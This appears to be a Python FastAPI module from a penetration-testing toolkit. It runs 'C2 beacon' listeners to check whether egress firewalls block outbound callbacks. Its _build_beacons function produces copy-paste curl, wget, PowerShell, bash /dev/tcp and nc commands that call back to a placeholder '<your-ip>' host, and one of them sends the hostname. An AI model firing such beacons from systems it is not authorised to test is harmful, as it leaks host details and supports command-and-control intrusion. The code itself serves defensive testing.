"""C2 Beacon Simulator — egress-test listeners.

Spin up a tiny TCP / HTTP server on a chosen port, give the user copy-pasteable
beacon commands (curl / wget / nc / powershell / bash bash-builtin TCP) that
they can fire from a target host. Anything that reaches us is recorded with
timestamp + source IP + method; the user polls (or watches) the callback log.

This is **defensive testing** — confirms whether your firewall actually blocks
the ports / methods you think it does, or whether your reverse shells can
phone home through your egress controls.

Endpoints:
  - POST /c2/listener  start a new listener
  - GET  /c2/listeners list all + recent callbacks per listener
  - DEL  /c2/listener/{id}  stop a listener
  - <listener internal>  on the listener's port: accepts any HTTP / raw TCP

Listeners bind to 0.0.0.0 by default so they're reachable from the LAN.
The user is responsible for opening their firewall and (optionally) routing
external traffic in (ngrok / Cloudflare tunnel etc).
"""
from __future__ import annotations

import asyncio
import ipaddress
import logging
import secrets
import time
from typing import Any

from fastapi import APIRouter, Depends, HTTPException, Request
from pydantic import BaseModel, Field

from lib import scope
from lib.auth import require_local_auth
from lib.errors import ErrorCode, MhpError
from lib.mode import get_engagement_id, get_mode
from lib.validators import validate_ip

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/c2", tags=["c2-beacon"],
                   dependencies=[Depends(require_local_auth)])

# ── Listener state ──────────────────────────────────────────────────────────

class Callback(BaseModel):
    ts: str
    source: str   # IP:port
    method: str   # HTTP method, "TCP_RAW", or similar
    path: str
    bytes_in: int
    preview: str  # First 200 chars (printable)


class Listener:
    """One asyncio server + its log of inbound callbacks."""
    def __init__(self, id: str, port: int, host: str, mode: str, token: str) -> None:
        self.id = id
        self.port = port
        self.host = host
        self.mode = mode       # "http" or "tcp"
        self.token = token     # included in suggested beacons
        self.created_at = _now()
        self.callbacks: list[dict[str, Any]] = []
        self.server: asyncio.base_events.Server | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id, "port": self.port, "host": self.host,
            "mode": self.mode, "token": self.token,
            "created_at": self.created_at,
            "callbacks": self.callbacks[-100:],
            "callback_count": len(self.callbacks),
        }

    def record(self, source: str, method: str, path: str, body: bytes) -> None:
        preview = body[:200]
        try:
            preview_s = preview.decode("utf-8", errors="replace")
        except Exception:
            preview_s = repr(preview)
        # Strip control chars from preview
        preview_s = "".join(c if c.isprintable() or c in "\r\n\t" else "·" for c in preview_s)
        self.callbacks.append({
            "ts": _now(), "source": source, "method": method,
            "path": path, "bytes_in": len(body), "preview": preview_s,
        })

    async def stop(self) -> None:
        if self.server is not None:
            self.server.close()
            try:
                await self.server.wait_closed()
            except Exception:
                pass
        self.server = None


_LISTENERS: dict[str, Listener] = {}


def _now() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


# ── HTTP listener handler ──────────────────────────────────────────────────

async def _serve_http(listener: Listener, reader: asyncio.StreamReader,
                       writer: asyncio.StreamWriter) -> None:
    """Bare-bones HTTP handler that 200's everything and records the request."""
    peer = writer.get_extra_info("peername")
    source = f"{peer[0]}:{peer[1]}" if peer else "?"
    try:
        # Read request line + headers
        head = b""
        while b"\r\n\r\n" not in head:
            chunk = await asyncio.wait_for(reader.read(4096), timeout=5.0)
            if not chunk:
                break
            head += chunk
            if len(head) > 8192:
                break
        try:
            req_line, _, rest = head.partition(b"\r\n")
            parts = req_line.decode("ascii", errors="replace").split(" ", 2)
            method = parts[0] if parts else ""
            path = parts[1] if len(parts) > 1 else "/"
        except Exception:
            method, path = "?", "/"
        # Best-effort body read if Content-Length present
        body = b""
        for line in rest.split(b"\r\n"):
            if line.lower().startswith(b"content-length:"):
                try:
                    n = int(line.split(b":", 1)[1].strip())
                    body = await asyncio.wait_for(reader.readexactly(n), timeout=5.0)
                except Exception:
                    pass
                break
        listener.record(source, method, path, head + body)
        # Respond with a small JSON ack
        resp = (f"HTTP/1.1 200 OK\r\nServer: s-ide-C2/0.1\r\n"
                f"Content-Type: application/json\r\nConnection: close\r\n\r\n"
                f'{{"beacon":"ack","token":"{listener.token}"}}').encode()
        writer.write(resp)
        await writer.drain()
    except Exception:
        pass
    finally:
        try: writer.close(); await writer.wait_closed()
        except Exception: pass


async def _serve_tcp(listener: Listener, reader: asyncio.StreamReader,
                      writer: asyncio.StreamWriter) -> None:
    """Bare TCP listener — record whatever the first packet contained."""
    peer = writer.get_extra_info("peername")
    source = f"{peer[0]}:{peer[1]}" if peer else "?"
    try:
        data = await asyncio.wait_for(reader.read(4096), timeout=3.0)
        listener.record(source, "TCP_RAW", "", data)
        writer.write(b"beacon-ack\n")
        await writer.drain()
    except Exception:
        listener.record(source, "TCP_RAW", "", b"")
    finally:
        try: writer.close(); await writer.wait_closed()
        except Exception: pass


# ── Endpoints ───────────────────────────────────────────────────────────────

class StartBody(BaseModel):
    port: int = Field(..., ge=1, le=65535)
    host: str = Field("0.0.0.0")
    mode: str = Field("http", pattern="^(http|tcp)$")


@router.post("/listener")
async def start_listener(body: StartBody, request: Request) -> dict[str, Any]:
    # Validate the bind IP early — accepts 0.0.0.0 / 127.0.0.1 / any IP literal.
    # Reject anything that isn't a parseable IP so we don't pass garbage to
    # asyncio.start_server (which would surface a less actionable OSError).
    host = validate_ip(body.host, field="host")
    # The listener binds locally and receives callbacks — there's no remote
    # "target" to scope-match. Engagement mode still requires a valid
    # engagement so the listener (and any future callbacks) tie to a record.
    scope.enforce_engagement_present(get_engagement_id(request), get_mode(request))

    if any(l.port == body.port for l in _LISTENERS.values()):
        raise HTTPException(409, f"port {body.port} already in use by another listener")

    lid = secrets.token_hex(4)
    token = secrets.token_urlsafe(12)
    listener = Listener(id=lid, port=body.port, host=host,
                        mode=body.mode, token=token)

    handler = _serve_http if body.mode == "http" else _serve_tcp
    try:
        server = await asyncio.start_server(
            lambda r, w: handler(listener, r, w),
            host=host, port=body.port,
        )
    except OSError as exc:
        logger.info("c2 bind failed host=%s port=%s err=%s", host, body.port, exc)
        raise HTTPException(400, f"could not bind {host}:{body.port}")
    listener.server = server
    _LISTENERS[lid] = listener

    return {
        "listener": listener.to_dict(),
        "beacons":  _build_beacons(listener),
    }


@router.get("/listeners")
def list_listeners() -> dict[str, Any]:
    return {
        "listeners": [l.to_dict() for l in _LISTENERS.values()],
        "beacons":   {lid: _build_beacons(l) for lid, l in _LISTENERS.items()},
    }


@router.get("/listener/{lid}")
def get_listener(lid: str) -> dict[str, Any]:
    l = _LISTENERS.get(lid)
    if not l:
        raise HTTPException(404, "listener not found")
    return {"listener": l.to_dict(), "beacons": _build_beacons(l)}


@router.delete("/listener/{lid}")
async def stop_listener(lid: str) -> dict[str, bool]:
    l = _LISTENERS.pop(lid, None)
    if not l:
        raise HTTPException(404, "listener not found")
    await l.stop()
    return {"stopped": True}


def _build_beacons(l: Listener) -> dict[str, str]:
    """Suggested test commands the user copies to a target host."""
    base_http = f"http://<your-ip>:{l.port}"
    if l.mode == "http":
        return {
            "curl":       f"curl -m 5 -X POST {base_http}/{l.token}/$(hostname)",
            "wget":       f"wget --timeout=5 -O- {base_http}/{l.token}",
            "powershell": f"powershell -nop -c \"Invoke-WebRequest -UseBasicParsing -Uri '{base_http}/{l.token}'\"",
            "bash":       f"echo -e 'GET /{l.token} HTTP/1.0\\r\\nHost: x\\r\\n\\r\\n' | "
                          f"timeout 5 bash -c '</dev/tcp/<your-ip>/{l.port}; cat'",
            "nc":         f"nc -w 5 <your-ip> {l.port} <<< '{l.token}'",
        }
    # tcp
    return {
        "nc":         f"echo '{l.token}' | nc -w 5 <your-ip> {l.port}",
        "bash":       f"echo '{l.token}' > /dev/tcp/<your-ip>/{l.port}",
        "powershell": f"powershell -nop -c \"$c=New-Object System.Net.Sockets.TcpClient('<your-ip>', {l.port});"
                       f"$s=$c.GetStream();$b=[Text.Encoding]::ASCII.GetBytes('{l.token}');$s.Write($b,0,$b.Length)\"",
    }
